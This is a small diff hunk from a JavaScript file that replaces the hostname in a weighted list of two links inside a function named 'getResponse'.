@@ -72,8 +72,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://coral-app-tmdj6.ondigitalocean.app/", weight: 0.5 },
-        { url: "https://coral-app-tmdj6.ondigitalocean.app/", weight: 0.5 }
+        { url: "https://seashell-app-7lr78.ondigitalocean.app/", weight: 0.5 },
+        { url: "https://seashell-app-7lr78.ondigitalocean.app/", weight: 0.5 }
       
     ];
 
